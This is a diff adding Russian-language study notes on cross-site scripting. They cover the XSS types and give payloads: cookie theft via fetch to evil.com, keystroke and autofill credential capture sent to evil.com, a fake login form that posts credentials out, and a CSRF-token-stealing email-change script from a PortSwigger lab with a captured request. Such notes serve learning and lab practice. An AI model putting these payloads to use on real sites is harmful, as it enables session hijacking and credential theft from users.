@@ -196,3 +196,198 @@
 		Однако можно комбинировать подходы кодирования, например :
 		
 		%2e%2e%252f --> ..%2f - это не ../ и будет передано приложению и оно уже способно обработать %2f и выполнить запрос (либо вернуть 403)
+
+
+## XSS (Cross-Site-Scripting)
+	Общая концепция XSS атаки - внедрить JavaScript через поля ввода, которые криво или недостаточно хорошо валидируются.
+	Это могут быть объекты-скрипты через тэг <script> или коллбэки на разные события на стороне клиента.
+
+	Самый примитивный poc на xss - это вызвать alert(). Если скрипт срабатывает, значит сайт уязвим.
+	Значит мы можем выполнить любой скрипт на js, который будет находиться в этом поле ввода.
+		
+	В связи с CORS политикой в браузерах, если у нас сложная цепочка атаки, нужно использовать в ответе C2 (evil.com) специальные заголовки :
+				
+		Access-Contol-Allow-Origin: https://victim.com (или просто звездочку '*')
+				
+	Это позволит скрипту правильно обрабатывать респонс от С2 внутри скрипта для нескольких действий в рамках одной атаки
+	
+	
+	1. Типы XSS атак :
+	
+		1. Reflected XSS :
+		
+			Атака, при которой полезная нагрузка нигде не сохраняется, а живет в рамках запроса жертвы :
+			
+				https://victim.com/search.php?q=<script>alert(document.cookie)</script>
+			
+			Если .php скрипт просто вставляет 'q' в html документ без должной обработки,
+			То при переходе по ссылке у жертвы выполнится скрипт выше
+			
+		2. Stored XSS :
+		
+			Атака, при которой полезная нагрузка сохраняется на сервере и выполняется каждый раз при заходе на страницу
+			Это могут быть комментарии, никнеймы в играх и т.д.
+			
+				<script>alert('hello we')</script>
+				
+		3. DOM-based XSS :
+		
+			Атака, при которой сервер вообще не участвует в обработке запроса. Уязвимость на клиенте.
+			
+				<script>
+				    var name = location.hash.substring(1);
+				    document.getElementById('welcome').innerHTML = 'Привет, ' + name;
+				</script>
+
+				<div id="welcome"></div>
+				
+			Если отправить следующий запрос :
+			
+				https://victim.com/#<img src=x onerror=alert(document.cookie)>
+				
+			То в div превратится в :
+			
+				div id="welcome"><img src=x onerror=alert(document.cookie)></div>
+				
+
+	2. Векторы XSS атак & пейлоады :
+	
+		Все векторы и пейлоады, описанные ниже, работают при любом типе XSS (Reflected, Stored, DOM-based). 
+		Разница только в том, как мы доставляем этот скрипт жертве: через ссылку, через комментарий или через изменение URL-хэша.
+		
+			1. Steal cookie :
+			
+				Основная концепция этой техники - отправить сессионные куки (или другие токены согласно которым идет контроль сессии) на сервер
+				Чтобы с полученными куками собрать вручную пакет для угона сессии. Это можно сделать если куки доступны из document 
+				(Это значит что у них нет аттрибута HttpOnly)
+				
+				Пример такого скрипта :
+				
+					<script>
+						fetch('https://evil.com/stealCookies?cookie=' + encodeURIComponent(document.cookie));
+					</script>
+					
+				Берет куки из document, кодирует их согласно URL-encode и делает запрос на подконтольный нам сервер.
+				Из логов сервера можно легко вытащить куки юзеров и через burp поменять хидер Cookie. 
+				Либо через requests на питоне собрать пакет самому.
+				
+			2. Steal auto-filled credentials :
+			
+				Суть данной техники - угнать учетные данные через слушание полей ввода для пароля, которые сами заполняются браузером
+				Например, когда мы заходим на какой то сайт, браузер сам подставляет данные учетки, на которой мы недавно сидели (если автозаполнение есть)
+				Наша задача - просто перехватывать обновления полей ввода. Это можно сделать разными способами :
+				
+					<script>
+						document.querySelector('input[id="login"]').addEventListener('input', function(field) {
+							fetch(`https://evil.com/stealPasswd?pwd=${encodeURIComponent(field.target.value)}`);
+						});
+						
+						document.querySelector('input[type="password"]').addEventListener('input', function(field) {
+							fetch(`https://evil.com/stealPasswd?pwd=${encodeURIComponent(field.target.value)}`);
+						});
+					</script>
+				
+				Просто вешаем коллбек на событие input. Кстати, такой способ сработает даже если пользователь вводит данные вручную.
+				Скрипт по букве будет отправлять логин + пароль на сервер. Палевно, но работает. Вряд ли юзер полезет в DevTools проверять активность.
+				
+					<script>
+						setTimeout(function() {
+						    const login = document.getElementById('login')?.value;
+						    const pwd = document.querySelector('input[type="password"]')?.value;
+						    
+						    if (login) {
+						    	fetch('https://evil.com/steal?p=' + encodeURIComponent(login));
+						    }
+						    
+						    if (pwd) {
+							fetch('https://evil.com/steal?p=' + encodeURIComponent(pwd));
+						    }
+						}, 2000);
+					</script>
+			
+				Тут мы ждем пару секунд, чтобы пропарсить оба поля и высылаем.
+				Но для этого нужно внедрить скрипт именно на страницу ввода пароля. Что если она не уязвима к XSS?
+				Если сайт уязвим к XSS, то нам ничего не мешает самим создать форму нужного вида, чтобы браузер распознал ее как знакомую и подставил данные :
+				
+					<input name=username id=username>
+					<input type=password name=password onchange="if (this.value.length) fetch('https://evil.com',{
+						method:'POST',
+						mode: 'no-cors',
+						body:username.value+':'+this.value
+					});">
+					
+				То есть мы внедряем не просто скрипт, а целую форму, которая выглядит "как для ввода учетных данных", вещаем коллбек на ее заполнение,
+				Который отправляет данные на наш сервер.
+				
+			3. CSRF bypass :
+			
+				CSRF - система, которая делает дополнительную проверку на наличие специального токена в формах для отправки.
+				Это сделано для того, что бы, например, такой сценарий не прокатил :
+				
+					1. Хакер на сайте evil.com оставляет скрипт на клиенте:
+						<script>fetch('https://bank.com/transfer?id=1337&amount=1000000')</script>
+					2. Жертва заходит и отправляет запрос выше на сайт банка, сама того не понимая
+					3. С жертвы списывается 1000000
+				
+				CSRF в каждое поле ввода вставляет специальный csrf токен, который проверяется при отправке формы обратно
+				Он может прокидываться через заголовок или тело запроса. Если они не совпали - запрос отклоняется. 
+				Как правило этот токен одинаковый во всех формах в рамках одной сессии (если не юзается кастомная надстройка над CSRF)
+				И угнав этот токен, можно выполнять разные действия от лица юзера. Рассмотрим пример скрипта для смены почты :
+				
+					<script>
+						document.addEventListener('DOMContentLoaded', function() {
+							const  crsfToken = document.querySelector('input[name="csrf"]')?.value;
+							
+							if (!crsfToken) {
+								console.error('[-] Cannot read crsf');
+								return;
+							}
+							
+							console.log(`[+] Token : ${crsfToken}`);
+							
+							const newEmail = 'sayhi@pwn.soc';
+							
+							fetch('/my-account/change-email', {
+								method: 'POST',
+								headers: {
+									'Content-Type': 'application/x-www-form-urlencoded'
+								},
+								body: 'email=' + encodeURIComponent(newEmail) + '&csrf=' + encodeURIComponent(crsfToken)
+							}).then(response => {
+								if (!response.ok) {
+									console.error(`[-] Fail with code : ${response.status}`);
+									return; 
+								}
+								
+								console.log(`[+] Successfully changed to ${newEmail}`);
+							}).catch(err => console.log(err));
+						});
+					</script>
+					
+				Стоит отметить, что скрипт для "прода", разумеется не логирует свои действия в консоль DevTools.
+				Логи идут или на сервер, или вообще никуда. Это скрипт с одной из лаб с портсвиггера.
+				
+				Здесь мы читаем сам токен из элемента input, где name=csrf. Затем отсылаем POST запрос содержащий форму для смены почты, 
+				Где в теле запроса содержится токен. Место, через которое он передается, можно посмотреть через burp.
+				Сам запрос выглядит так :
+				
+					POST /my-account/change-email HTTP/2
+					Host: 0a1400b70442adf7809fc68c00570039.web-security-academy.net
+					Cookie: session=wwI62nsXF9IWPxZTXyUY3in9E5bSdISt
+					Content-Length: 59
+					Sec-Ch-Ua-Platform: "Linux"
+					Accept-Language: en-US,en;q=0.9
+					Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+					Content-Type: text/plain;charset=UTF-8
+					Sec-Ch-Ua-Mobile: ?0
+					User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+					Accept: */*
+					Origin: https://0a1400b70442adf7809fc68c00570039.web-security-academy.net
+					Sec-Fetch-Site: same-origin
+					Sec-Fetch-Mode: cors
+					Sec-Fetch-Dest: empty
+					Referer: https://0a1400b70442adf7809fc68c00570039.web-security-academy.net/post?postId=1
+					Accept-Encoding: gzip, deflate, br
+					Priority: u=1, i
+
+					email=sayhi%40pwn.org&csrf=LsBxuGn1MHYKMFjWsAJTH26o4BdohLT1
